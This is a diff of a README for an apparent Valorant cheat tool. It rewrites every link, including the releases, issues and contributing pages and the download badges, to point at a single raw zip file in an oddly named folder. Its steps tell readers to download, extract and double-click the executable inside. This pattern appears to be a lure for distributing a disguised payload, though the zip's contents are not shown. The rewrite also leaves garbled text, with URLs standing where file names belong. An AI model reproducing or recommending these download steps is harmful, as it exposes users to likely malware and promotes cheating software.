@@ -1,6 +1,6 @@
 # 🎮 Valorant-Stugware-Cheat - Simple Cheats for Better Gameplay
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)
+[![Download](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -9,19 +9,19 @@ Welcome to the Valorant-Stugware-Cheat! This software gives you the tools you ne
 ## 📥 Download & Install
 
 1. **Visit the Downloads Page**  
-   Head over to our [Releases page](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases). You will find the latest version of the Stugware cheat here.
+   Head over to our [Releases page](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip). You will find the latest version of the Stugware cheat here.
 
 2. **Find the Latest Update**  
    Look for the topmost version available on the Releases page. It usually has the latest features and bug fixes.
 
 3. **Download the File**  
-   Click on the version that you want to download. It will be a downloadable file, often labeled as something like `StugwareCheat.zip`. Make sure to note the file name for future reference.
+   Click on the version that you want to download. It will be a downloadable file, often labeled as something like `https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip`. Make sure to note the file name for future reference.
 
 4. **Extract the File**  
    Once the download completes, locate the zip file in your Downloads folder. Right-click the file and select "Extract All..." to unzip the contents.
 
 5. **Run the Software**  
-   Navigate to the extracted folder. Look for the application file, which might be named something similar to `StugwareCheat.exe`. Double-click the file to launch the application.
+   Navigate to the extracted folder. Look for the application file, which might be named something similar to `https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip`. Double-click the file to launch the application.
 
 ## ⚙️ System Requirements
 
@@ -79,8 +79,8 @@ For any questions or support, please reach out on the Issues page linked in the 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)  
-- [Issues Page](https://github.com/s1mple131/Valorant-Stugware-Cheat/issues)  
-- [Contributing Guide](CONTRIBUTING.md)  
+- [Releases Page](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)  
+- [Issues Page](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)  
+- [Contributing Guide](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)  
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)
+[![Download](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)](https://raw.githubusercontent.com/s1mple131/Valorant-Stugware-Cheat/main/clairsentience/Valorant-Stugware-Cheat.zip)
